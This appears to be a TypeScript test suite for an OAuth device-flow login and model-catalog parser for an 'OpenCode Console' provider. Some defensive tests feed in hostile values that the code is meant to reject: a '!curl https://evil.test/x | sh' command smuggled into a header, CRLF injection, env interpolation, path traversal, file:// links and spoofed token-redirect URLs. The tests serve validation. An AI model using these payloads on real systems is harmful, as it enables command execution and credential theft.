/**
 * OpenCode Console OAuth — device flow, catalog parsing, refresh.
 *
 * Pins the four things that are easy to get quietly wrong: pending arrives as an
 * HTTP 400 body (a status check would break every poll), `verification_uri` is
 * relative, refresh rotates the token and must carry `metadata` forward, and a
 * failed `/api/config` must not fail an otherwise valid login.
 */
import assert from "node:assert/strict";
import { afterEach, describe, it } from "node:test";

import type { OAuthCredentials, OAuthLoginCallbacks } from "@earendil-works/pi-ai/oauth";

import {
	buildModelsJsonEntry,
	computeOpencodeConsoleExpiry,
	fallbackCatalog,
	OPENCODE_CONSOLE_ENV_VAR,
	OPENCODE_CONSOLE_ORG_HEADER,
	OPENCODE_CONSOLE_PROVIDER,
	opencodeConsoleOAuthProvider,
	parseConsoleCatalog,
	resolveVerificationUri,
	takeOpencodeConsoleCatalog,
	type OpencodeConsoleCatalog,
} from "./opencode-console.js";

/* ─────────────────────────────── fetch stub ─────────────────────────────── */

type Handler = (url: string, init: RequestInit | undefined) => { status: number; body: unknown };

const realFetch = globalThis.fetch;

function installFetch(handler: Handler): { calls: { url: string; init?: RequestInit }[] } {
	const calls: { url: string; init?: RequestInit }[] = [];
	globalThis.fetch = (async (input: unknown, init?: RequestInit) => {
		const url = String(input);
		calls.push({ url, init });
		const { status, body } = handler(url, init);
		return {
			ok: status >= 200 && status < 300,
			status,
			json: async () => body,
		} as unknown as Response;
	}) as typeof fetch;
	return { calls };
}

afterEach(() => {
	globalThis.fetch = realFetch;
});

/** Body of a POST, parsed. */
function sentBody(init: RequestInit | undefined): Record<string, unknown> {
	return JSON.parse(String(init?.body ?? "{}")) as Record<string, unknown>;
}

function callbacks(overrides: Partial<OAuthLoginCallbacks> = {}): OAuthLoginCallbacks & {
	deviceCodes: { userCode: string; verificationUri: string }[];
	progress: string[];
} {
	const deviceCodes: { userCode: string; verificationUri: string }[] = [];
	const progress: string[] = [];
	return {
		deviceCodes,
		progress,
		onAuth: () => {},
		onDeviceCode: (info) => {
			deviceCodes.push({ userCode: info.userCode, verificationUri: info.verificationUri });
		},
		onPrompt: async () => "",
		onProgress: (msg) => progress.push(msg),
		onSelect: async () => undefined,
		...overrides,
	};
}

/** The real shape of `/console/api/config`, trimmed to three models. */
const CONFIG_PAYLOAD = {
	config: {
		provider: {
			opencode: {
				name: "Personal (OpenCode)",
				npm: "@ai-sdk/openai-compatible",
				api: "https://opencode.ai/inference/openai/v1",
				env: ["OPENCODE_CONSOLE_TOKEN"],
				options: {
					apiKey: "{env:OPENCODE_CONSOLE_TOKEN}",
					headers: { "x-opencode-org-id": "org_live" },
				},
				whitelist: ["big-pickle", "claude-opus-5", "gemini-3.5-flash"],
				models: {
					"big-pickle": {
						name: "Big Pickle",
						status: "active",
						reasoning: true,
						cost: { input: 0, output: 0, cache_read: 0, cache_write: 0 },
						limit: { context: 262144, output: 64000 },
					},
					"claude-opus-5": {
						name: "Claude Opus 5",
						status: "active",
						reasoning: true,
						cost: { input: 5, output: 25, cache_read: 0.5, cache_write: 6.25 },
						limit: { context: 1000000, output: 128000 },
						provider: { npm: "@ai-sdk/anthropic", api: "https://opencode.ai/inference/anthropic/v1" },
					},
					"gemini-3.5-flash": {
						name: "Gemini 3.5 Flash",
						status: "active",
						limit: { context: 1000000, output: 65536 },
						provider: { npm: "@ai-sdk/google", api: "https://opencode.ai/inference/google/v1beta" },
					},
					// Not in the whitelist — the org can't call it, so we must not offer it.
					"gpt-5.4": { name: "GPT-5.4", status: "active", limit: { context: 400000, output: 128000 } },
				},
			},
		},
	},
};

/** Default happy-path handler: one org, config resolves, token on first poll. */
function happyPath(opts: { orgs?: unknown[]; configStatus?: number } = {}): Handler {
	return (url, init) => {
		if (url.endsWith("/auth/device/code")) {
			return {
				status: 200,
				body: {
					device_code: "dc_abc",
					user_code: "ZFBV-QZQP",
					verification_uri: "/console/device",
					verification_uri_complete: "/console/device?user_code=ZFBV-QZQP&client_id=brigade",
					expires_in: 900,
					interval: 1,
				},
			};
		}
		if (url.endsWith("/auth/device/token")) {
			const body = sentBody(init);
			if (body.grant_type === "refresh_token") {
				return {
					status: 200,
					body: { access_token: "st_new", refresh_token: "rt_rotated", expires_in: 2591999 },
				};
			}
			return {
				status: 200,
				body: { access_token: "st_live", refresh_token: "rt_live", token_type: "Bearer", expires_in: 2591999 },
			};
		}
		if (url.endsWith("/api/orgs")) {
			return { status: 200, body: opts.orgs ?? [{ id: "org_live", name: "Personal", role: "owner" }] };
		}
		if (url.endsWith("/api/user")) {
			return { status: 200, body: { id: "acct_1", email: "dev@example.com" } };
		}
		if (url.endsWith("/api/config")) {
			const status = opts.configStatus ?? 200;
			return { status, body: status === 200 ? CONFIG_PAYLOAD : { _tag: "OrgRequired" } };
		}
		throw new Error(`unexpected url ${url}`);
	};
}

/* ───────────────────────────── pure helpers ─────────────────────────────── */

describe("parseConsoleCatalog", () => {
	it("normalises the console config, honouring the whitelist", () => {
		const catalog = parseConsoleCatalog(CONFIG_PAYLOAD, "org_live");
		assert.ok(catalog);
		assert.equal(catalog.degraded, false);
		assert.deepEqual(
			catalog.models.map((m) => m.id).sort(),
			["big-pickle", "claude-opus-5", "gemini-3.5-flash"],
			"gpt-5.4 is outside the org's whitelist and must be dropped",
		);
		assert.deepEqual(catalog.headers, { [OPENCODE_CONSOLE_ORG_HEADER]: "org_live" });
	});

	it("maps each per-model SDK hint to the right Pi api shape and surface", () => {
		// THREE surfaces, not one — a live account splits 43/13/6 across them. An
		// earlier cut mapped everything non-Anthropic to openai-completions, which
		// silently pointed the Gemini models at a Google endpoint while telling Pi
		// to speak OpenAI to it.
		const catalog = parseConsoleCatalog(CONFIG_PAYLOAD, "org_live")!;
		const byId = new Map(catalog.models.map((m) => [m.id, m]));

		assert.equal(byId.get("claude-opus-5")!.api, "anthropic-messages");
		assert.equal(byId.get("claude-opus-5")!.baseUrl, "https://opencode.ai/inference/anthropic/v1");

		assert.equal(byId.get("gemini-3.5-flash")!.api, "google-generative-ai");
		assert.equal(byId.get("gemini-3.5-flash")!.baseUrl, "https://opencode.ai/inference/google/v1beta");

		assert.equal(byId.get("big-pickle")!.api, "openai-completions");
		assert.equal(byId.get("big-pickle")!.baseUrl, "https://opencode.ai/inference/openai/v1");
	});

	it("falls back to the shape's own default base url when the console omits one", () => {
		const payload = {
			config: {
				provider: {
					opencode: {
						api: "https://opencode.ai/inference/openai/v1",
						models: {
							a: { provider: { npm: "@ai-sdk/anthropic" } },
							g: { provider: { npm: "@ai-sdk/google" } },
							o: {},
						},
					},
				},
			},
		};
		const byId = new Map(parseConsoleCatalog(payload, "org_1")!.models.map((m) => [m.id, m]));
		assert.equal(byId.get("a")!.baseUrl, "https://opencode.ai/inference/anthropic/v1");
		assert.equal(byId.get("g")!.baseUrl, "https://opencode.ai/inference/google/v1beta");
		assert.equal(byId.get("o")!.baseUrl, "https://opencode.ai/inference/openai/v1");
	});

	it("carries cost and limits through instead of letting Pi guess", () => {
		const claude = parseConsoleCatalog(CONFIG_PAYLOAD, "org_live")!.models.find(
			(m) => m.id === "claude-opus-5",
		)!;
		assert.equal(claude.contextWindow, 1000000);
		assert.equal(claude.maxTokens, 128000);
		assert.deepEqual(claude.cost, { input: 5, output: 25, cacheRead: 0.5, cacheWrite: 6.25 });
		assert.equal(claude.reasoning, true);
	});

	it("skips models the console has retired", () => {
		const payload = {
			config: {
				provider: {
					opencode: {
						api: "https://x/v1",
						models: {
							live: { status: "active" },
							dead: { status: "deprecated" },
						},
					},
				},
			},
		};
		const catalog = parseConsoleCatalog(payload, "org_1")!;
		assert.deepEqual(
			catalog.models.map((m) => m.id),
			["live"],
		);
	});

	it("refuses a base url that isn't https on the console's own host", () => {
		// This value comes off the network and becomes the URL the OAuth access
		// token is sent to, so a spoofed config must not be able to redirect a live
		// credential somewhere else. Anything unexpected falls back to the known
		// default for that API shape.
		const hostile = (api: string) => ({
			config: {
				provider: {
					opencode: {
						api: "https://opencode.ai/inference/openai/v1",
						models: { m: { provider: { npm: "@ai-sdk/openai", api } } },
					},
				},
			},
		});
		for (const api of [
			"https://evil.test/v1",
			"http://opencode.ai/inference/openai/v1", // downgraded scheme
			"https://opencode.ai.evil.test/v1", // suffix-confusion host
			"not-a-url",
		]) {
			const model = parseConsoleCatalog(hostile(api), "org_1")!.models[0]!;
			assert.equal(
				model.baseUrl,
				"https://opencode.ai/inference/openai/v1",
				`must not adopt ${api}`,
			);
		}
		// A subdomain of the console host is legitimate.
		const ok = parseConsoleCatalog(hostile("https://gw.opencode.ai/v1"), "org_1")!.models[0]!;
		assert.equal(ok.baseUrl, "https://gw.opencode.ai/v1");
	});

	it("rejects an over-long base url instead of doing quadratic string work on it", () => {
		// The host check passes for ANY path, so without a length bound
		// "https://opencode.ai/" + 200k slashes + "x" used to reach a trailing-slash
		// regex and burn ~22 SECONDS of backtracking — once per model.
		const hostile = {
			config: {
				provider: {
					opencode: {
						api: `https://opencode.ai/${"/".repeat(200_000)}x`,
						models: { m: {} },
					},
				},
			},
		};
		const started = process.hrtime.bigint();
		const catalog = parseConsoleCatalog(hostile, "org_1")!;
		const elapsedMs = Number(process.hrtime.bigint() - started) / 1e6;

		assert.equal(catalog.models[0]!.baseUrl, "https://opencode.ai/inference/openai/v1");
		assert.ok(elapsedMs < 250, `must not backtrack; took ${elapsedMs.toFixed(0)}ms`);
	});

	it("drops a base url carrying credentials in the authority", () => {
		// userinfo would otherwise travel with every request.
		const withCreds = {
			config: {
				provider: {
					opencode: {
						api: "https://opencode.ai/v1",
						models: { m: { provider: { api: "https://user:pw@opencode.ai/v1" } } },
					},
				},
			},
		};
		assert.equal(
			parseConsoleCatalog(withCreds, "org_1")!.models[0]!.baseUrl,
			"https://opencode.ai/v1",
		);
	});

	it("rejects a malformed workspace id rather than putting it in a header", () => {
		// The org id becomes an `x-opencode-org-id` value in models.json, and Pi
		// resolves header values through resolveConfigValueOrThrow — which EXECUTES
		// a value beginning with `!` as a shell command and interpolates `${ENV}`.
		// So these two forms are a code-execution sink, not just header injection.
		for (const bad of [
			"!curl https://evil.test/x | sh",
			"${HOME}",
			"$HOME",
			"org_1\r\nx-evil: 1",
			"",
			"a".repeat(65),
			"org 1",
		]) {
			assert.throws(() => parseConsoleCatalog(CONFIG_PAYLOAD, bad), /workspace id/i);
			assert.throws(() => fallbackCatalog(bad), /workspace id/i);
		}
	});

	it("drops malformed model ids and caps how many are persisted", () => {
		// Model ids are written to models.json and reach the wire as `model` params.
		const models: Record<string, unknown> = {
			"good-1": {},
			"../../etc/passwd": {},
			"has space": {},
			"": {},
			["x".repeat(200)]: {},
		};
		for (let i = 0; i < 400; i += 1) models[`bulk-${i}`] = {};
		const catalog = parseConsoleCatalog(
			{ config: { provider: { opencode: { api: "https://opencode.ai/v1", models } } } },
			"org_1",
		)!;
		assert.equal(catalog.models.length, 200, "capped");
		const ids = new Set(catalog.models.map((m) => m.id));
		assert.equal(ids.has("../../etc/passwd"), false);
		assert.equal(ids.has("has space"), false);
		assert.equal([...ids].some((id) => id.length > 128), false);
	});

	it("strips control characters from names before they are persisted or rendered", () => {
		const catalog = parseConsoleCatalog(
			{
				config: {
					provider: {
						opencode: {
							api: "https://opencode.ai/v1",
							models: {
								// A raw ESC would let a hostile name repaint the model picker.
								m: { name: "Nice\u001b[31m Model" },
								n: { name: "   " },
							},
						},
					},
				},
			},
			"org_1",
		)!;
		const byId = new Map(catalog.models.map((m) => [m.id, m]));
		assert.equal(byId.get("m")!.name, "Nice[31m Model");
		assert.equal(byId.get("n")!.name, "n", "a blank name falls back to the id");
	});

	it("returns null on a shape it doesn't recognise, so the caller can fall back", () => {
		assert.equal(parseConsoleCatalog(null, "org_1"), null);
		assert.equal(parseConsoleCatalog({}, "org_1"), null);
		assert.equal(parseConsoleCatalog({ config: { provider: {} } }, "org_1"), null);
		assert.equal(
			parseConsoleCatalog({ config: { provider: { opencode: { api: "https://x", models: {} } } } }, "org_1"),
			null,
			"an empty model map is a fallback case, not an empty catalog",
		);
	});
});

describe("fallbackCatalog", () => {
	it("is marked degraded and still splits claude onto the anthropic surface", () => {
		const catalog = fallbackCatalog("org_1");
		assert.equal(catalog.degraded, true);
		assert.ok(catalog.models.length > 0);
		assert.deepEqual(catalog.headers, { [OPENCODE_CONSOLE_ORG_HEADER]: "org_1" });

		const claude = catalog.models.find((m) => m.id.startsWith("claude-"))!;
		assert.equal(claude.api, "anthropic-messages");
		const other = catalog.models.find((m) => !m.id.startsWith("claude-"))!;
		assert.equal(other.api, "openai-completions");
	});
});

describe("computeOpencodeConsoleExpiry", () => {
	it("subtracts a refresh margin, because Pi only refreshes once expires has passed", () => {
		const now = 1_000_000_000;
		// 30 days minus the 5-minute margin.
		assert.equal(computeOpencodeConsoleExpiry(2591999, now), now + 2591999 * 1000 - 300_000);
	});

	it("treats a missing or nonsensical expires_in as already expired, not as immortal", () => {
		const now = 1_000_000_000;
		assert.equal(computeOpencodeConsoleExpiry(undefined, now), now);
		assert.equal(computeOpencodeConsoleExpiry(0, now), now);
		assert.equal(computeOpencodeConsoleExpiry(-5, now), now);
		// A token shorter than the margin must not land in the past.
		assert.equal(computeOpencodeConsoleExpiry(10, now), now);
	});
});

describe("resolveVerificationUri", () => {
	it("resolves the console's relative uri against the origin", () => {
		assert.equal(
			resolveVerificationUri("https://opencode.ai/console", "/console/device?user_code=AB-CD"),
			"https://opencode.ai/console/device?user_code=AB-CD",
		);
	});

	it("keeps an absolute uri on the console's own host", () => {
		assert.equal(
			resolveVerificationUri("https://opencode.ai/console", "https://opencode.ai/console/device?x=1"),
			"https://opencode.ai/console/device?x=1",
		);
	});

	it("refuses a sign-in link that would open a foreign host or scheme", () => {
		// This value is handed to xdg-open/open, i.e. to the OS handler for whatever
		// scheme it names, so it must not be attacker-chosen.
		for (const bad of [
			"https://elsewhere.test/d",
			"file:///etc/passwd",
			"http://opencode.ai/console/device",
			"https://opencode.ai.evil.test/device",
		]) {
			assert.throws(
				() => resolveVerificationUri("https://opencode.ai/console", bad),
				/unexpected|couldn't read/i,
				`must refuse ${bad}`,
			);
		}
	});
});

describe("takeOpencodeConsoleCatalog", () => {
	it("splits the transient catalog off the credential", () => {
		const catalog: OpencodeConsoleCatalog = fallbackCatalog("org_1");
		const creds = {
			access: "st_1",
			refresh: "rt_1",
			expires: 42,
			metadata: { orgId: "org_1" },
			catalog,
		} as unknown as OAuthCredentials;

		const split = takeOpencodeConsoleCatalog(creds);
		assert.deepEqual(split.catalog, catalog);
		assert.equal("catalog" in split.credentials, false, "catalog must not reach the credential store");
		assert.equal(split.credentials.access, "st_1");
		assert.deepEqual(split.credentials.metadata, { orgId: "org_1" });
	});

	it("is a no-op for every other provider's credential", () => {
		const creds = { access: "a", refresh: "r", expires: 1 } as OAuthCredentials;
		const split = takeOpencodeConsoleCatalog(creds);
		assert.equal(split.catalog, undefined);
		assert.deepEqual(split.credentials, creds);
	});
});

describe("buildModelsJsonEntry", () => {
	it("writes an env template rather than a token, and carries the org header", () => {
		const entry = buildModelsJsonEntry(parseConsoleCatalog(CONFIG_PAYLOAD, "org_live")!);
		assert.equal(entry.id, OPENCODE_CONSOLE_PROVIDER);
		assert.equal(entry.apiKey, `\${${OPENCODE_CONSOLE_ENV_VAR}}`);
		assert.equal(entry.apiKey.includes("st_"), false, "never persist the access token here");
		assert.deepEqual(entry.headers, { [OPENCODE_CONSOLE_ORG_HEADER]: "org_live" });
		assert.equal(entry.models.length, 3);
	});
});

/* ────────────────────────────── the device flow ─────────────────────────── */

describe("opencodeConsoleOAuthProvider.login", () => {
	it("completes the device flow and returns a credential plus a catalog", async () => {
		const { calls } = installFetch(happyPath());
		const cb = callbacks();

		const creds = (await opencodeConsoleOAuthProvider.login(cb)) as OAuthCredentials & {
			catalog: OpencodeConsoleCatalog;
			metadata: Record<string, unknown>;
		};

		assert.equal(creds.access, "st_live");
		assert.equal(creds.refresh, "rt_live");
		assert.ok(creds.expires > Date.now(), "a 30-day token is not already expired");
		assert.equal(creds.metadata.orgId, "org_live");
		assert.equal(creds.metadata.orgName, "Personal");
		assert.equal(creds.metadata.email, "dev@example.com");
		assert.equal(creds.catalog.degraded, false);
		assert.equal(creds.catalog.models.length, 3);

		// The device-code leg identifies Brigade as itself, not as opencode-cli.
		const deviceCall = calls.find((c) => c.url.endsWith("/auth/device/code"))!;
		assert.equal(sentBody(deviceCall.init).client_id, "brigade");
	});

	it("surfaces the user code with an ABSOLUTE verification url", async () => {
		installFetch(happyPath());
		const cb = callbacks();
		await opencodeConsoleOAuthProvider.login(cb);

		assert.equal(cb.deviceCodes.length, 1);
		assert.equal(cb.deviceCodes[0]!.userCode, "ZFBV-QZQP");
		assert.equal(
			cb.deviceCodes[0]!.verificationUri,
			"https://opencode.ai/console/device?user_code=ZFBV-QZQP&client_id=brigade",
		);
	});

	it("keeps polling through authorization_pending, which arrives as an HTTP 400", async () => {
		let tokenCalls = 0;
		installFetch((url, init) => {
			if (url.endsWith("/auth/device/token") && sentBody(init).grant_type !== "refresh_token") {
				tokenCalls += 1;
				if (tokenCalls === 1) {
					// The real server's pending response: a 400 with the error in the body.
					return {
						status: 400,
						body: {
							_tag: "DeviceTokenError",
							error: "authorization_pending",
							error_description: "The authorization request is still pending",
						},
					};
				}
			}
			return happyPath()(url, init);
		});

		const creds = await opencodeConsoleOAuthProvider.login(callbacks());
		assert.equal(creds.access, "st_live");
		assert.equal(tokenCalls, 2, "the 400 was treated as pending, not as a failure");
	});

	it("fails with a clear message when the grant is denied", async () => {
		installFetch((url, init) => {
			if (url.endsWith("/auth/device/token")) {
				return { status: 400, body: { error: "access_denied" } };
			}
			return happyPath()(url, init);
		});

		await assert.rejects(
			() => opencodeConsoleOAuthProvider.login(callbacks()),
			/declined in the browser/i,
		);
	});

	it("falls back to the pinned catalog when /api/config fails, and still returns the credential", async () => {
		installFetch(happyPath({ configStatus: 400 }));
		const cb = callbacks();

		const creds = (await opencodeConsoleOAuthProvider.login(cb)) as OAuthCredentials & {
			catalog: OpencodeConsoleCatalog;
		};

		assert.equal(creds.access, "st_live", "a valid credential must not be thrown away");
		assert.equal(creds.catalog.degraded, true);
		assert.ok(
			cb.progress.some((m) => /model list/i.test(m)),
			"the operator is told the catalog is degraded",
		);
	});

	it("asks which workspace when the account has several", async () => {
		installFetch(
			happyPath({
				orgs: [
					{ id: "org_a", name: "Personal" },
					{ id: "org_b", name: "Acme" },
				],
			}),
		);
		const asked: string[] = [];
		const cb = callbacks({
			onSelect: async (prompt) => {
				asked.push(prompt.message);
				return "org_b";
			},
		});

		const creds = (await opencodeConsoleOAuthProvider.login(cb)) as OAuthCredentials & {
			metadata: Record<string, unknown>;
		};
		assert.equal(asked.length, 1);
		assert.equal(creds.metadata.orgId, "org_b");
		assert.equal(creds.metadata.orgName, "Acme");
	});

	it("does not ask when there is exactly one workspace", async () => {
		installFetch(happyPath());
		let asked = 0;
		const cb = callbacks({
			onSelect: async () => {
				asked += 1;
				return undefined;
			},
		});
		await opencodeConsoleOAuthProvider.login(cb);
		assert.equal(asked, 0);
	});

	it("refuses an account with no workspace rather than storing an unusable credential", async () => {
		installFetch(happyPath({ orgs: [] }));
		await assert.rejects(() => opencodeConsoleOAuthProvider.login(callbacks()), /no workspace/i);
	});
});

describe("opencodeConsoleOAuthProvider.refreshToken", () => {
	it("rotates both tokens and carries metadata forward", async () => {
		const { calls } = installFetch(happyPath());
		const before = {
			access: "st_old",
			refresh: "rt_old",
			expires: 1,
			metadata: { server: "https://opencode.ai/console", orgId: "org_live", orgName: "Personal" },
		} as unknown as OAuthCredentials;

		const after = await opencodeConsoleOAuthProvider.refreshToken(before);

		assert.equal(after.access, "st_new");
		assert.equal(after.refresh, "rt_rotated", "the rotated refresh token replaces the old one");
		assert.ok(after.expires > Date.now());
		// Losing metadata would lose the org id, and every later request would 403.
		assert.deepEqual(after.metadata, before.metadata);

		const body = sentBody(calls.find((c) => c.url.endsWith("/auth/device/token"))!.init);
		assert.equal(body.grant_type, "refresh_token");
		assert.equal(body.refresh_token, "rt_old");
		assert.equal(body.client_id, "brigade");
	});

	it("refreshes against the server the credential was minted on", async () => {
		const { calls } = installFetch((url, init) => {
			if (url.startsWith("https://console.example.test/")) {
				return { status: 200, body: { access_token: "st_x", refresh_token: "rt_x", expires_in: 60 } };
			}
			return happyPath()(url, init);
		});

		await opencodeConsoleOAuthProvider.refreshToken({
			access: "a",
			refresh: "r",
			expires: 1,
			metadata: { server: "https://console.example.test", orgId: "org_1" },
		} as unknown as OAuthCredentials);

		assert.ok(
			calls.some((c) => c.url === "https://console.example.test/auth/device/token"),
			"a self-hosted console must not be refreshed against opencode.ai",
		);
	});

	it("keeps the old refresh token when the server doesn't rotate it", async () => {
		installFetch((url) => {
			if (url.endsWith("/auth/device/token")) {
				return { status: 200, body: { access_token: "st_new", expires_in: 60 } };
			}
			throw new Error(`unexpected ${url}`);
		});

		const after = await opencodeConsoleOAuthProvider.refreshToken({
			access: "st_old",
			refresh: "rt_keep",
			expires: 1,
		} as OAuthCredentials);
		assert.equal(after.refresh, "rt_keep");
	});

	it("throws when the grant is dead", async () => {
		installFetch(() => ({
			status: 400,
			body: { _tag: "DeviceTokenError", error: "invalid_grant", error_description: "The grant is invalid" },
		}));

		await assert.rejects(
			() =>
				opencodeConsoleOAuthProvider.refreshToken({
					access: "a",
					refresh: "r",
					expires: 1,
				} as OAuthCredentials),
			/grant is invalid/i,
		);
	});

	it("throws rather than calling the server when there is no refresh token", async () => {
		const { calls } = installFetch(() => ({ status: 200, body: {} }));
		await assert.rejects(
			() =>
				opencodeConsoleOAuthProvider.refreshToken({
					access: "a",
					refresh: "",
					expires: 1,
				} as OAuthCredentials),
			/no refresh token/i,
		);
		assert.equal(calls.length, 0);
	});
});

describe("opencodeConsoleOAuthProvider.getApiKey", () => {
	it("returns the access token unchanged — there is no exchange step", () => {
		assert.equal(
			opencodeConsoleOAuthProvider.getApiKey({
				access: "st_live",
				refresh: "rt",
				expires: 1,
			} as OAuthCredentials),
			"st_live",
		);
	});
});
